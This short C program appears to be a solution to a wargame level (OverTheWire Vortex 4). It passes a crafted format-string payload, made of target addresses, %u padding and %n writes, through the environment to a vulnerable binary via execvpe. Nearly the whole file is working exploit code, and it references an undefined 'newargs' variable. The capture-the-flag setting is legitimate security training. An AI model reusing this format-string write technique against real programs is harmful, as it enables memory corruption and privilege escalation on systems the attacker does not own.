#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#include <debug.h>

char *newenv[] = { 
    "CCCC", 
    "BBBB", 
    "\x14\xa0\x04\x08||||\x15\xa0\x04\x08||||\x16\xa0\x04\x08\x17\xa0\x04\x08%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u%u%u%u%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u%u.%u.%u%u%u%u%u%u%u%u....%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u%u%u.%71u%n%208u%n%203u%n%n\x00\x00", 
    "\x14\xa0\x04\x08", 
};

int main(int argc, char *argv[]) {
    int fd = 0;
    int rc = 0;

    rc = execvpe("/home/bmoar/git/hacking/otw/vortex/5/vortex4", newargs, newenv);
    check(rc != -1, "should not have failed to execvpe with newenv[2]");

error:
    exit(7);
}
